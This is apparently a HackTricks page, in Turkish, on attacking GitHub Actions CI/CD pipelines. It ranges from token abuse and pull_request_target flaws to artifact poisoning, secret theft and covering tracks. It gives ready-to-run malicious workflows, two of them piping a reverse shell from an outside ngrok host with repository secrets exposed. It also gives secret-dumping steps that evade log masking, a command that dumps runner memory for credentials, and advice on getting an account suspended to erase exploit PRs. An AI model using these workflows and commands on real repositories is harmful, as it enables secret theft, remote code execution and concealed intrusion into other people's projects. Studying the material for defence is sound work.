# Github Actions'ı Kötüye Kullanma

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 Discord grubuna** [**katılın**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **HackTricks'e PR göndererek hacking ipuçlarını paylaşın** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.

</details>
{% endhint %}

## Temel Bilgiler

Bu sayfada bulacaklarınız:

* Bir saldırganın bir Github Action'a erişim sağlamasının **tüm etkilerinin özeti**
* Bir action'a **erişim sağlamak için farklı yollar**:
* Action oluşturma **izinlerine** sahip olmak
* **Pull request** ile ilgili tetikleyicileri kötüye kullanma
* **Diğer dış erişim** tekniklerini kötüye kullanma
* Zaten ele geçirilmiş bir repodan **pivot yapma**
* Son olarak, içeriden bir action'ı kötüye kullanmak için **post-exploitation teknikleri** hakkında bir bölüm (belirtilen etkileri gerçekleştirmek için)

## Etkiler Özeti

[**Github Actions hakkında giriş bilgisi**](../basic-github-information.md#github-actions) için buraya bakın.

Bir **depo**da **keyfi Github action'ları çalıştırabilir/kod enjekte edebilirseniz**, şunları yapabilirsiniz:

* O repo/organizasyondan **gizli bilgileri** **çalmak**.
* Sadece enjekte edebiliyorsanız, workflow'da zaten mevcut olan her şeyi çalabilirsiniz.
* AWS ve GCP gibi diğer platformlara erişmek için **repo ayrıcalıklarını** kötüye kullanmak.
* **Özel işçilerde kod çalıştırmak** (özel işçiler kullanılıyorsa) ve oradan pivot yapmaya çalışmak.
* Depo **kodunu** **üzerine yazmak**.
* Bu, `GITHUB_TOKEN`'ın (varsa) ayrıcalıklarına bağlıdır.
* **Dağıtımları** ve diğer **artifaktları** **ele geçirmek**.
* Kod bir şey dağıtıyor veya depoluyorsa, bunu değiştirebilir ve daha fazla erişim elde edebilirsiniz.

## GITHUB\_TOKEN

Bu "**gizli**" bilgi (`${{ secrets.GITHUB_TOKEN }}` ve `${{ github.token }}`'dan gelen), admin bu seçeneği etkinleştirdiğinde verilir:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Bu token, bir **Github Uygulamasının kullanacağı** aynı token'dır, bu yüzden aynı uç noktalara erişebilir: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github, bir repo'nun `GITHUB_TOKEN` kullanarak diğer dahili repolara erişebilmesi için **çapraz-repo** erişimine izin veren bir [**akış**](https://github.com/github/roadmap/issues/74) yayınlamalıdır.
{% endhint %}

Bu token'ın olası **izinlerini** şu adreste görebilirsiniz: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Token'ın **iş tamamlandıktan sonra süresinin dolduğunu** unutmayın.\
Bu token'lar şu şekilde görünür: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Bu token ile yapabileceğiniz bazı ilginç şeyler:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Approve PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="PR Oluştur" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Dikkat edin ki, birçok durumda **Github Actions ortamlarında veya gizli anahtarlar içinde github kullanıcı token'ları bulabilirsiniz**. Bu token'lar size depo ve organizasyon üzerinde daha fazla ayrıcalık verebilir.
{% endhint %}

<details>

<summary>Github Action çıktısında gizli anahtarları listele</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Sırlar ile ters kabuk elde etme</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Başka kullanıcıların depolarındaki bir Github Token'a verilen izinleri **logları kontrol ederek** kontrol etmek mümkündür:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## İzin Verilen Yürütme

{% hint style="info" %}
Bu, Github actions'ı ele geçirmenin en kolay yolu olacaktır, çünkü bu durumda **organizasyonda yeni bir depo oluşturma** erişiminiz veya bir depo üzerinde **yazma ayrıcalıklarınız** olduğunu varsayar.

Bu senaryoda iseniz, [Post Exploitation tekniklerini](./#post-exploitation-techniques-from-inside-an-action) kontrol edebilirsiniz.
{% endhint %}

### Depo Oluşturmadan Yürütme

Bir organizasyonun üyeleri **yeni depolar oluşturabiliyorsa** ve github actions'ı çalıştırabiliyorsanız, **yeni bir depo oluşturabilir ve organizasyon seviyesinde ayarlanan sırları çalabilirsiniz**.

### Yeni Bir Daldan Yürütme

Eğer **zaten bir Github Action** yapılandırılmış bir depoda **yeni bir dal oluşturabiliyorsanız**, onu **değiştirebilir**, **içeriği yükleyebilir** ve ardından **yeni daldan bu action'ı çalıştırabilirsiniz**. Bu şekilde **depo ve organizasyon seviyesindeki sırları dışarı çıkarabilirsiniz** (ancak nasıl adlandırıldıklarını bilmeniz gerekir).

Değiştirilmiş action'ı **manuel olarak**, bir **PR oluşturulduğunda** veya **bazı kodlar yüklendiğinde** çalıştırılabilir hale getirebilirsiniz (ne kadar gürültü yapmak istediğinize bağlı olarak):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Çatallanmış Yürütme

{% hint style="info" %}
Bir saldırganın **başka bir deposunun Github Action'ını çalıştırmasına** izin verebilecek farklı tetikleyiciler vardır. Bu tetiklenebilir eylemler kötü yapılandırılmışsa, bir saldırgan bunları ele geçirebilir.
{% endhint %}

### `pull_request`

İş akışı tetikleyicisi **`pull_request`**, bazı istisnalar dışında her pull request alındığında iş akışını çalıştıracaktır: varsayılan olarak, **ilk kez** **işbirliği** yapıyorsanız, bir **bakıcının** iş akışının **çalıştırılmasını** **onaylaması** gerekecektir:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Varsayılan sınırlama **ilk kez** katkıda bulunanlar için olduğundan, **geçerli bir hata/typo düzeltmesi** yaparak katkıda bulunabilir ve ardından **yeni `pull_request` ayrıcalıklarınızı kötüye kullanmak için diğer PR'leri gönderebilirsiniz**.

**Bunu test ettim ve çalışmıyor**: ~~Başka bir seçenek, projeye katkıda bulunan ve hesabını silen birinin adıyla bir hesap oluşturmak olabilir.~~
{% endhint %}

Ayrıca, varsayılan olarak hedef depoya **yazma izinlerini** ve **gizli bilgilere erişimi** engeller, [**belgelerde**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) belirtildiği gibi:

> `GITHUB_TOKEN` hariç, **gizli bilgiler bir iş akışı çatallanmış bir depodan tetiklendiğinde çalıştırıcıya iletilmez**. **`GITHUB_TOKEN` çatallanmış depolardan gelen pull request'lerde salt okunur izinlere sahiptir**.

Bir saldırgan, Github Action tanımını keyfi şeyler yürütmek ve keyfi eylemler eklemek için değiştirebilir. Ancak, belirtilen sınırlamalar nedeniyle gizli bilgileri çalamaz veya depoyu üzerine yazamaz.

{% hint style="danger" %}
**Evet, saldırgan PR'de tetiklenecek github action'ı değiştirirse, kullanılan Github Action onunki olacak ve orijinal depodan olan değil!**
{% endhint %}

Saldırgan yürütülen kodu da kontrol ettiğinden, `GITHUB_TOKEN` üzerinde gizli bilgiler veya yazma izinleri olmasa bile, bir saldırgan örneğin **kötü amaçlı eserler yükleyebilir**.

### **`pull_request_target`**

İş akışı tetikleyicisi **`pull_request_target`** hedef depoya **yazma iznine** ve **gizli bilgilere erişime** sahiptir (ve izin istemez).

İş akışı tetikleyicisi **`pull_request_target`**'ın **temel bağlamda** çalıştığını ve PR tarafından verilen bağlamda çalışmadığını unutmayın (güvenilmeyen kodu **çalıştırmamak** için). `pull_request_target` hakkında daha fazla bilgi için [**belgeleri kontrol edin**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Ayrıca, bu özel tehlikeli kullanım hakkında daha fazla bilgi için bu [**github blog yazısını**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) kontrol edin.

**Çalıştırılan iş akışı** PR'de tanımlanan değil, **temelde tanımlanan** olduğu için **`pull_request_target`** kullanmanın **güvenli** olduğunu düşünebilirsiniz, ancak **birkaç durumda güvenli değildir**.

Ve bu, **gizli bilgilere erişime** sahip olacaktır.

### `workflow_run`

[**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) tetikleyicisi, bir iş akışı `tamamlandığında`, `talep edildiğinde` veya `devam ederken` başka bir iş akışını çalıştırmaya izin verir.

Bu örnekte, ayrı "Testleri Çalıştır" iş akışı tamamlandıktan sonra bir iş akışının çalıştırılması yapılandırılmıştır:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Ayrıca, belgelere göre: `workflow_run` olayı tarafından başlatılan iş akışı, **önceki iş akışı olmasa bile sırları ve yazma belirteçlerini erişebilir**.

Bu tür bir iş akışı, **dış kullanıcı tarafından** **`pull_request`** veya **`pull_request_target`** aracılığıyla **tetiklenebilen** bir **iş akışına** **bağlıysa** saldırıya uğrayabilir. Birkaç savunmasız örnek [**bu blogda bulunabilir**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** İlk örnek, saldırganın kodunu indiren **`workflow_run`** tetiklenen iş akışını içerir: `${{ github.event.pull_request.head.sha }}`\
İkinci örnek, **güvenilmeyen** koddan bir **artifact** geçirip bu artifact'in içeriğini **RCE'ye karşı savunmasız** hale getirecek şekilde kullanmayı içerir.

### `workflow_call`

TODO

TODO: pull\_request'ten çalıştırıldığında kullanılan/indirilen kodun orijinalden mi yoksa forked PR'den mi olduğunu kontrol et

## Forked Execution'ı Kötüye Kullanma

Bir dış saldırganın bir github iş akışını çalıştırmasını sağlayabileceği tüm yolları belirttik, şimdi bu çalıştırmaların, kötü yapılandırılmışsa, nasıl kötüye kullanılabileceğine bakalım:

### Güvenilmeyen checkout çalıştırması

**`pull_request`** durumunda, iş akışı **PR bağlamında** çalıştırılacaktır (bu nedenle **kötü niyetli PR kodunu** çalıştıracaktır), ancak birinin bunu **önce yetkilendirmesi** gerekir ve bazı [sınırlamalarla](./#pull\_request) çalışacaktır.

**`pull_request_target` veya `workflow_run`** kullanan ve **`pull_request_target` veya `pull_request`** tarafından tetiklenebilen bir iş akışına bağlı bir iş akışı durumunda, orijinal repo kodu çalıştırılacaktır, bu nedenle **saldırgan çalıştırılan kodu kontrol edemez**.

{% hint style="danger" %}
Ancak, **eylem** **PR checkout**'unu açıkça belirtiyorsa ve bu **PR kodunu** (temelden değil) alacaksa, saldırganın kontrol ettiği kodu kullanacaktır. Örneğin (PR kodunun indirildiği 12. satıra bakın):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># GÜVENSİZ. Sadece örnek olarak sağlanmıştır.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

**npm install veya npm build** sırasında potansiyel olarak **güvenilmeyen kod çalıştırılıyor** çünkü build scriptleri ve referans verilen **paketler PR yazarının kontrolündedir**.

{% hint style="warning" %}
Savunmasız eylemleri aramak için bir github dork: `event.pull_request pull_request_target extension:yml` ancak, eylem güvensiz yapılandırılmış olsa bile işleri güvenli bir şekilde çalıştırmak için farklı yollar vardır (örneğin, PR'yi oluşturan aktörün kim olduğuna dair koşulları kullanmak gibi).
{% endhint %}

### Context Script Enjeksiyonları <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Belirli [**github context**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) değerlerinin **PR oluşturan kullanıcı** tarafından **kontrol edildiğini** unutmayın. Github eylemi bu **veriyi bir şey çalıştırmak için kullanıyorsa**, bu **keyfi kod çalıştırmaya** yol açabilir:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Script Enjeksiyonu** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Belgelere göre: Bir iş akışı işinde herhangi bir sonraki adımda kullanılabilir bir **çevre değişkeni** tanımlayarak veya güncelleyerek ve bunu **`GITHUB_ENV`** çevre dosyasına yazarak kullanılabilir hale getirebilirsiniz.

Bir saldırgan bu **env** değişkenine **herhangi bir değer enjekte edebilirse**, sonraki adımlarda kod çalıştırabilecek env değişkenlerini (örneğin **LD\_PRELOAD** veya **NODE\_OPTIONS**) enjekte edebilir.

Örneğin ([**bu**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) ve [**bu**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), bir iş akışının içeriğini **`GITHUB_ENV`** env değişkeninde saklamak için yüklenen bir artifact'e güvendiğini hayal edin. Bir saldırgan bunu tehlikeye atmak için şöyle bir şey yükleyebilir:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### Savunmasız Üçüncü Taraf Github Eylemleri

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

[**bu blog yazısında**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks) belirtildiği gibi, bu Github Eylemi farklı iş akışlarından ve hatta depolardan artifact'lere erişim sağlar.

Sorun şu ki, **`path`** parametresi ayarlanmazsa, artifact mevcut dizine çıkarılır ve daha sonra kullanılabilecek veya hatta iş akışında çalıştırılabilecek dosyaların üzerine yazabilir. Bu nedenle, Artifact savunmasızsa, bir saldırgan bunu diğer iş akışlarını tehlikeye atmak için kötüye kullanabilir.

Savunmasız iş akışı örneği:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Bu, şu iş akışı ile saldırıya uğrayabilir:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Diğer Harici Erişim

### Silinmiş Namespace Repo Kaçırma

Bir hesap adını değiştirirse, bir süre sonra başka bir kullanıcı o adı kullanarak bir hesap oluşturabilir. Eğer bir depo **ad değişikliğinden önce 100 yıldızdan az** almışsa, Github aynı adı taşıyan yeni kayıtlı kullanıcıya **aynı adla bir depo oluşturmasına** izin verir.

{% hint style="danger" %}
Yani bir eylem var olmayan bir hesaptan bir depo kullanıyorsa, bir saldırganın o hesabı oluşturup eylemi tehlikeye atması hala mümkündür.
{% endhint %}

Eğer diğer depolar **bu kullanıcının depolarından bağımlılıklar** kullanıyorsa, bir saldırgan onları kaçırabilir. Daha ayrıntılı bir açıklama için buraya bakabilirsiniz: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo Pivoting

{% hint style="info" %}
Bu bölümde, ilkine bir tür erişimimiz olduğunu varsayarak (önceki bölüme bakın) **bir repodan diğerine geçiş yapmamıza** olanak tanıyacak tekniklerden bahsedeceğiz.
{% endhint %}

### Cache Poisoning

**Aynı dalda yapılan workflow çalışmaları** arasında bir önbellek tutulur. Bu, bir saldırganın bir **paketi** tehlikeye atması ve bu paketin önbelleğe alınması ve daha **yetkili** bir workflow tarafından **indirilip** çalıştırılması durumunda, o workflow'u da **tehlikeye atabileceği** anlamına gelir.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Artifact Poisoning

Workflows **diğer workflows ve hatta repolardan artifactler** kullanabilir, eğer bir saldırgan bir **artifact yükleyen Github Action'ı** tehlikeye atarsa ve bu artifact daha sonra başka bir workflow tarafından kullanılırsa, diğer workflows'u da **tehlikeye atabilir**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Bir Eylemden Sonra İstismar

### OIDC ile AWS ve GCP'ye Erişim

Aşağıdaki sayfalara göz atın:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Secrets Erişimi <a href="#accessing-secrets" id="accessing-secrets"></a>

Bir script'e içerik enjekte ediyorsanız, secrets'a nasıl erişebileceğinizi bilmek ilginçtir:

* Eğer secret veya token bir **çevre değişkeni** olarak ayarlanmışsa, **`printenv`** kullanarak doğrudan çevreden erişilebilir.

<details>

<summary>Github Action çıktısında secrets listele</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Sırlar ile ters kabuk elde etme</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Eğer gizli bilgi **doğrudan bir ifadede** kullanılıyorsa, oluşturulan kabuk betiği **diskte** saklanır ve erişilebilir.
* ```bash
cat /home/runner/work/_temp/*
```
* Bir JavaScript aksiyonu için gizli bilgiler ortam değişkenleri aracılığıyla gönderilir
* ```bash
ps axe | grep node
```
*   Bir **özel aksiyon** için, risk, programın **argümandan** aldığı gizli bilgiyi nasıl kullandığına bağlı olarak değişebilir:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Self-hosted runner'ları Kötüye Kullanma

**Github Actions'ın github dışı altyapıda çalıştırıldığını** bulmanın yolu, Github Action yapılandırma yaml dosyasında **`runs-on: self-hosted`** ifadesini aramaktır.

**Self-hosted** runner'lar **ekstra hassas bilgilere**, diğer **ağ sistemlerine** (ağdaki savunmasız uç noktalar? metadata servisi?) erişebilir veya izole edilip yok edilse bile, **aynı anda birden fazla aksiyon çalıştırılabilir** ve kötü niyetli olan diğerinin **gizli bilgilerini çalabilir**.

Self-hosted runner'larda, \_Runner.Listener\_\*\* sürecinden\*\* gizli bilgileri elde etmek de mümkündür; bu süreç, herhangi bir adımda iş akışlarının tüm gizli bilgilerini içerecektir ve belleği dökerek elde edilebilir:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Daha fazla bilgi için [**bu gönderiye bakın**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Github eylemleri ile **Docker imajı oluşturup Github içinde depolamak** mümkündür.\
Aşağıdaki genişletilebilir örnekte bulunabilir:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Önceki kodda görebileceğiniz gibi, Github kaydı **`ghcr.io`** adresinde barındırılmaktadır.

Depo üzerinde okuma izinlerine sahip bir kullanıcı, kişisel erişim belirteci kullanarak Docker Image'ı indirebilecektir:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Daha sonra, kullanıcı **Docker imaj katmanlarında sızdırılmış sırları arayabilir:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Github Actions loglarında hassas bilgiler

**Github**, eylem loglarında **gizli değerleri tespit etmeye** ve **göstermemeye** çalışsa da, eylemin yürütülmesi sırasında üretilmiş olabilecek **diğer hassas veriler** gizlenmeyecektir. Örneğin, gizli bir değerle imzalanmış bir JWT, [özellikle yapılandırılmadıkça](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) gizlenmeyecektir.

## İzlerinizi Kapatma

([**Buradan**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit) alınan teknik) Öncelikle, açılan herhangi bir PR, Github'da ve hedef GitHub hesabında halka açık olarak görünür. GitHub'da varsayılan olarak, **internetten bir PR'yi silemeyiz**, ancak bir püf noktası var. Github tarafından **askıya alınan** GitHub hesapları için, tüm **PR'leri otomatik olarak silinir** ve internetten kaldırılır. Bu nedenle, etkinliğinizi gizlemek için ya **GitHub hesabınızın askıya alınmasını ya da hesabınızın işaretlenmesini** sağlamalısınız. Bu, GitHub'daki tüm etkinliklerinizi internetten gizleyecektir (temelde tüm exploit PR'lerinizi kaldırır).

GitHub'daki bir organizasyon, hesapları GitHub'a bildirme konusunda çok proaktiftir. Tek yapmanız gereken, Issue'da "bazı şeyler" paylaşmak ve hesabınızın 12 saat içinde askıya alınmasını sağlamak :p ve işte bu kadar, exploit'inizi GitHub'da görünmez hale getirdiniz.

{% hint style="warning" %}
Bir organizasyonun hedef alındığını anlamasının tek yolu, GitHub UI'dan PR kaldırılacağı için SIEM'den GitHub loglarını kontrol etmektir.
{% endhint %}

## Araçlar

Aşağıdaki araçlar, Github Action iş akışlarını bulmak ve hatta savunmasız olanları bulmak için kullanışlıdır:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) **bizi takip edin.**
* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub depolarına PR göndererek hacking ipuçlarını paylaşın.

</details>
{% endhint %}
